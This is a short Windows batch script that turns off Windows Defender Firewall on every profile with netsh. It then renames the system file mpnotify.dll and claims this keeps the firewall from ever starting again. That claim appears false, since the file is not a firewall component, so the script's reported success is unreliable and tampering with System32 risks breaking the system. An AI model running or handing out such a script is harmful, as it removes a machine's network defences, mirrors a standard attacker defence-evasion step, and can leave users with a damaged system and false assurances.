@echo off
::turns the firewall off
netsh advfirewall set allprofiles state off

::renames a supporting dll to perma make the firewall not work
echo Renaming mpnotify.dll to prevent firewall from starting...
ren C:\Windows\System32\mpnotify.dll mpnotify.old
echo Windows Defender Firewall has been disabled and renamed, preventing it from starting again.
